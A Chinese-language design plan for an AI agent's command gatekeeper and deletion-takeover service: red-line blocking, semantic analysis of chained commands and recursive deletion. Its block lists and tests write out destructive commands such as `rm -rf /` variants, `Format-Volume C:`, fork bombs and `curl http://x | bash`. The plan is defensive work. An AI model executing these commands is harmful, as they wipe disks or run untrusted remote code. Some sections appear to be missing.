## 0. 结论先行

**一句话**：删除接管接口（快照 + 回收站双模式 + 100% 拦截）是差异化旗舰（参考项目均无回收站语义，评分 9/10），其工程前提是「命令语义分析层」——正则必然被等价变形绕过（`rm -rf -- ./`、`&&` 链、PowerShell 变体），必须先建拆段与间接执行识别底座，再谈红线、删除重定向与 git 回退面积计算。

**三条总原则**（贯穿本方案全部任务）：

1. **删除只走接口，命令面重定向**：AI 的删除操作只能经统一删除服务；bash 命中删除形态时拦截并引导（ref-analysis 01 坑 1 对策）。
2. **破坏性操作前必有快照，且备份不需审批**：文件快照（git-free）为默认自动备份形态，挂中间件 `before_execute` 钩子（05 §13.3「无论用户是否同意都自动暂存备份」的工程铁律）；stash 降级为「用户明确同意的恢复操作」专用。
3. **红线 100% 拦截，且不可被任何权限模式豁免**：三明治分层——静态红线（第一层）→ 语义兜底防绕过（第二层）→ 审批面走 C3/C4（第三层）；`full-access/yolo` 不豁免红线（ref-analysis 01 Top 9 借鉴点）。

**范围**：本方案只写逻辑执行顺序与任务分解，不写时间/人员/优先级；轮次编排（I1–I3）与总览呼应，编排见 00-总览。

## 1. 现状执行链与缺口（自然内化现有体系）

### 1.1 现有执行链（本方案全部任务挂接在这些点上，不另起炉灶）

```
工具调用（agent-tools 注册表）
```

## 2. 任务分解（S1–S11）

> 每个任务给出：目标 / 文件域（对接现有模块）/ 内容（子步骤）/ 验收命令。文件域冲突遵守 04 §4 互斥约定：`tool_events.rs`/`tool_exec.rs` 主体归 C3（本方案 S6）独占，其余任务只读或经钩子挂载。

### S1 命令语义分析层（全部安全能力的识别底座）

- **文件域**：`crates/conex-sandbox/src/semantics.rs`（新增）+ `crates/conex-sandbox/src/lib.rs`（gatekeeper 接入语义层判定，保留既有正则清单作第一层兜底）。
- **内容**：
  1. **复合命令拆段**：`&&` / `;` / `||` / `|` 链拆分为独立命令段，每段独立过判定（Reasonix `DecomposeBashCommand` 风格，ref-analysis 01 A2 差距 2）；PowerShell 的 `;` 链与 `-Command "a; b"` 同法处理。
  2. **间接执行分类**：`eval` / `source` / `bash -c` / `cmd /c` / `pwsh -Command` / `sudo` / `xargs` / `node -e` / `python -c` / `find -exec` / `ForEach-Object` 包裹内容 → 递归分析内层命令（Reasonix `bash_approval.go:70-114` 直接移植思路）；外层命令命中间接执行 → 内层结果整体升级（红线不可豁免、危险形态强制人工）。
  3. **字段级规范化**：引号剥离、转义还原、Windows 大小写折叠、长短参数归一（`--recursive --force` 与 `-r -f` 等价）、`rm -rf -- ./` 与 `rm -r -f /` 归一——这是「正则必漏」的根治层（ref-analysis 04 1a 坑 1）。
  4. **命令分类输出**：`CommandClass::{Normal, Redline, Dangerous, DeleteShape, GitRevertShape, Indirect}` + 拆段列表 + 目标路径列表（供工作区内判定）。
  5. **删除形态识别**（供 S4）：`rm` / `rmdir` / `del` / `erase` / `rd` / `Remove-Item` / `git rm`，且目标解析后在磁盘路径内 → `DeleteShape`。
  6. **git 回退形态识别**（供 S6）：`git reset --hard` / `git checkout <旧ref>` / `git clean -f` / `git stash drop` / `git revert --no-commit` / `git restore --source=<ref>` / 批量丢弃覆盖类（05 §2.4 危险命令清单全量）→ `GitRevertShape`。
- **验收命令**：
  - `cargo test -p conex-sandbox`（拆段 / 间接执行递归 / 规范化 / 分类六类单测）；
  - 断言示例：`echo hi && rm -rf /` 拆为两段且第二段 `Redline`；`sudo bash -c 'rm -rf /'` 内层识别 `Redline`；`Remove-Item -LiteralPath 'C:\x\y.txt' -Force` 识别 `DeleteShape`。

### S2 极端危险 100% 拦截（三明治第一、二层）

- **文件域**：`crates/conex-sandbox/src/lib.rs`（blocked 清单重写为红线清单，对象窄化）+ `crates/conex-sandbox/src/semantics.rs`（语义兜底）。
- **内容**：
  1. **静态红线清单（第一层，对象极小、判定确定、无业务歧义）**：合并既有 `blocked_patterns` 与 pi `CRITICAL_BASH_PATTERNS`，只对准**确定性毁灭目标**——根目录/设备/系统文件：`rm -rf /` 及变体、`mkfs` / `Format-Volume` / `Clear-Disk` / `format 盘符` / `dd` 写设备、写 `/etc/passwd` 类系统文件、`curl|bash` 远程执行、fork bomb、`Stop-Computer` / `Restart-Computer -Force`（清单集中管理为配置面显式项，默认开，版本可追加——坑 D 对策）。
  2. **语义兜底（第二层）**：S1 拆段 + 间接执行递归；链内任一段命中红线 → 整体拦截；规范化后判定（大小写、引号、转义、`--` 变体全防——坑 B 对策）。
  3. **误拦截防护（坑 A 对策）**：第一层模式只对准确定性毁灭目标；工作区内普通目录删除不命中红线（命中 `DeleteShape` → 走 S4 重定向），绝不拦合法自动化。
  4. **结构化失败文案**：返回「原因 + 建议替代路径 + 人工通道」（「此操作被产品安全红线拦截，请手动执行或在设置中关闭该红线」），模型不得静默重试（ref-analysis 01 Top 10；Reasonix deny 文案「不要重试同一操作」语义）；被拦事件落 events（`blocked-event`，S8 定义）。
- **验收命令**：
  - 拦截测试（全变体）：`rm -rf /`、`cd / && rm -rf *`、`rm --recursive --force /`、`rm -r -f /`、`rm -rf -- ./`、`Remove-Item -Recurse -Force C:\`、`Format-Volume C:`、`curl http://x | bash` → 全部 `Blocked`；
  - 误拦截防护：`rm -rf <工作区内目录>` → 断言**不**为 `Blocked`（应落 `DeleteShape`）；
  - `cargo test -p conex-sandbox`。

### S3 删除接管服务（统一删除接口，本方案核心）

- **文件域**：`crates/conex-fs`（**扩展既有 crate**：`path_utils` 模块已存在——`safe_canonicalize`/`compute_file_hash`/`ensure_parent_dir` + 6 测试，已登记根 `Cargo.toml` members；本轮新增 `trash` 服务模块：回收站双模式 + 文件快照 + 登记，供 agent-tools 工具与 session-loop 恢复命令共用。**任务卡文件域注明既有内容盘点**：先核对 `path_utils` 现状（`crates/conex-fs/src/lib.rs`）再增量扩展，不重写既有代码）+ `crates/agent-tools/src/tools/mod.rs`（注册 `delete_file` / `delete_dir`，8 工具变 10。*本计数只含删除线工具（I2 后 10、M2 后 11、M8 后 12 的全仓口径见 00 总览）*）+ `crates/agent-tools/src/definition.rs`（dangerous 标记 = true）+ `crates/conex-db/src/lib.rs`（events 登记走既有 append_event）。
- **内容**：
  1. **回收站双模式（坑 2 对策）**：
     - 模式 A（Windows 系统回收站）：优先 IFileOperation / SHFileOperation COM API，兜底 PowerShell `FileSystem.DeleteFile(Path, OnlyErrorDialogs, SendToRecycleBin)`（05 §0 推荐方式引擎化）；
     - 模式 B（应用内 trash 目录）：无桌面/容器/CI/非 Windows → `<workspace>/.crish-trash/<ts>/` 隔离目录，**该目录本身纳入快照与登记清单**（否则「两者皆无的删除不做」会在无回收站环境锁死所有删除——ref-analysis 04 1a 坑 2 对策）；降级状态显式返回调用方与 UI 明示；
     - 模式选择：运行时探测 + 会话配置键 `trash_mode`（可配，不硬编码）。
  2. **删除前自动备份（坑 3 + 4.2 建议）**：
     - **文件快照优先**：目标文件复制到会话级备份区 `<session-dir>/backups/<ts>/<相对路径>`（git-free，绝不触碰用户 git——Reasonix checkpoint 哲学）；快照结构对齐 `FileSnap`：路径 + 内容 + 是否原不存在（`Content == nil` 反向语义：恢复时执行删除，反之被删文件以快照还原——ref-analysis 01 A1 借鉴点 2）；
     - **可选 git stash**：仅当用户显式要求且目标为 git 跟踪时使用，命名 `crish:autobackup-<session>`，使用后立即 pop 并校验；pop 冲突 → 保留 stash + 结构化报错（pi `mergeTaskBranches` 冲突即停语义，ref-analysis 01 §4.2 对策 2）；
     - 自动备份**不需要审批**（只读、低成本），经 S10 的 middleware before_execute 钩子执行（05 §13.3 铁律）。
  3. **可恢复路径断言（05 §12.5 引擎化）**：执行删除前断言 git 跟踪（`git ls-files`）/ 备份快照 / 回收站 三选一成立；皆无（无回收站环境 + 未跟踪 + 快照失败）→ 拒绝删除并返回结构化错误（含原因与可做路径）。
  4. **接口原子化（坑 4 对策）**：先登记（events + 清单）→ 回收站/trash 删除 → 若 git 跟踪且删除有意 → `git add -u` 暂存删除记录（05 §0.3）；任一步失败返回结构化错误 + 恢复指引，不做半删除。
  5. **批量删除（05 §0.4）**：逐个走同一流程；报告含回收站条目清单（路径 + 是否 git 跟踪 + 可恢复路径类型）。
  6. **工具语义**：`delete_file` / `delete_dir` 输入路径列表，输出每项结果 + 可恢复路径类型 + 回收站条目；权限判定按**工具名**而非命令文本（Reasonix `IsFileMutationTool` 统一归类，ref-analysis 04 §4 Top 3）。
  7. **留存策略（ref-analysis 04 1a 坑 4）**：备份区留存窗口 + 轮转（默认 30 天，可配 `trash_retention_days`）；用户可显式「清空回收站」（清空动作本身走审批）。
- **验收命令**：
  - `cargo test -p conex-fs`（快照生成 / `Content == nil` 语义 / 双模式降级 / 原子化失败路径 / 留存轮转）；
  - 断言删除后快照存在、events 含登记（payload 有可恢复路径类型字段）；
  - 不可恢复断言：模拟「无回收站 + 未跟踪 + 快照失败」→ 删除被拒绝且返回结构化错误；
  - git 跟踪文件删除：断言工作区显示 deleted（物理删除前登记完成），`git add -u` 后暂存删除记录；
  - 批量删除：断言逐项登记、报告含条目清单。

### S4 bash 删除形态拦截与重定向（防 AI 绕过）

- **文件域**：`crates/conex-sandbox/src/semantics.rs`（`DeleteShape` 判定，S1 产出）+ shell/命令类工具执行面（agent-tools 命令工具执行前接 gatekeeper 判定点，工具执行处返回结构化结果）。
- **内容**：
  1. **坑 1 对策**：bash 命令命中 `DeleteShape` → 拦截并重定向引导（「检测到物理删除形态，已拦截；如确需删除请调用 `delete_file` / `delete_dir`」），返回结构化结果；模型可改走删除接口，删除只经统一服务。
  2. **复合链兜底**：链内任一段命中 `DeleteShape` → 整链拦截（S1 拆段保证，`&&` 链无法绕过——ref-analysis 01 坑 1 对策「拦截逻辑需语义分析，否则 && 链绕过」）。
  3. **工作区外目标**：物理删除目标在工作区外 → 一律拒绝（写根越界原则，Reasonix `WriteRoots` 借鉴，ref-analysis 01 A4 差距 1），不引导不降级。
  4. **不静默自动重定向**：只拦截 + 引导，不代为执行删除（链内其他段副作用不可控）；被拦事件落 events（`blocked-event`）。
- **验收命令**：
  - `cargo test -p conex-sandbox -p agent-tools`；
  - 绕过测试：`rm file.txt`、`Remove-Item file.txt`、`del file.txt`、`git rm file.txt`、`echo done && Remove-Item -Path x -Recurse`、`Remove-Item -LiteralPath x -Force` → 全部拦截 + 引导文案断言；
  - 工作区外：`rm C:\Users\x\Desktop\f.txt`（工作区外）→ 拒绝断言。

### S5 误删恢复入口（引擎命令 + UI 面板）

### 3.2 第二轮 I2：删除接管闭环

- **问题识别**：删除是 05 §0 铁律核心（2026-08-02 误删事故背景，05:260-269），现状为零引擎强制——无统一删除接口、bash 物理删除不受约束、无误删恢复入口、无删除审计事件。ref-analysis 01 结论：删除接管是差异化旗舰（9/10），工程成本最高，需独立一轮闭环。

## 4. 与现有审批体系的整合关系（执行链总图）

```
工具调用
  ├─ bash 命令 → CommandGatekeeper（conex-sandbox）
  │    红线第一层（静态清单）→ Blocked（full-access 不豁免，S2）
  │    语义第二层（S1 拆段/间接执行）→ 命中红线 → Blocked
  │    删除形态 → 拦截 + 引导 delete_file/delete_dir（S4）
  │    git 回退形态 → GitRevertShape（供 C3 面积判定，S6）
  │    其余 → Allowed / RequiresApproval（既有语义）
  └─ delete_file/delete_dir（dangerous=true）
        → call_verdict：permission.rs decide()（红线先行 → 三态矩阵，S10）
        → ApprovalGate.request_approval + ApprovalChannel ctx.ask（复用，approval.rs）
        → middleware before_execute：自动备份快照钩子（S10b，不需要审批）
        → conex-fs 执行：可恢复断言 → 登记 events → 回收站/trash → git add -u 决策（S3）
```

**关键关系**：
- **删除走统一门禁而非散落工具级**：唯一入口 = `delete_file`/`delete_dir`；bash 物理删除被 S4 重定向——命令面与工具面收敛到同一门禁。
- **红线不可被模式豁免**：`decide()` 红线先行分支在任何权限模式下直接 Deny（Top 9 借鉴点）；审批面（C3/C4）是第三层，可被 full-access 放行（语义不变）。
- **审批优先于中间件**（既有语义不变）：自动备份钩子只在「审批通过」后执行；中间件 Block 不绕过审批；备份不触发审批（只读低成本）。
- **C4 叠加在 C3 上**：C4 只是会话级计数 + 判定钩子，不新开审批通道（ref-analysis 04 1b 坑 3）。
- **CommandPolicy 兜底**：无审批门（approval=None）时 C3 阈值检查仍生效（C3 验收第 5 条，安全优先哲学保持——ref-analysis 01 A3 差距 3：与 Reasonix 非交互放行相反，Crish 选择安全优先）。
